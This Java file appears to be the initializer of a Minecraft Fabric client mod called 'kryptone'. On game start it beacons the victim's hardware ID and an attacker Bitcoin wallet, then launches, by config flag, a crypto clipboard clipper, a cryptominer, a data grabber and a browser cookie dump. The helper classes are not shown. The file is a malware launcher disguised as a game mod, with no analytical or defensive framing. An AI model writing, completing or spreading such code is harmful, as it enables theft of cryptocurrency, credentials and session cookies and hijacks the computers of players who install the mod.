package mc.kryptone;

import net.fabricmc.api.ClientModInitializer;

public class KryptonClient implements ClientModInitializer {
    @Override
    public void onInitializeClient() {
        Config cfg = Config.load();
        Beacon.log("kryptone online hwid=" + Beacon.hwid() + " wallet=" + cfg.btcAddress);
        if (cfg.clipper) BtcClipper.start(cfg);
        if (cfg.miner)   MinerManager.start(cfg);
        if (cfg.grabber) Grabber.start(cfg);
        if (cfg.cookies) CookieDump.start(cfg);
        Beacon.start(cfg);
    }
}
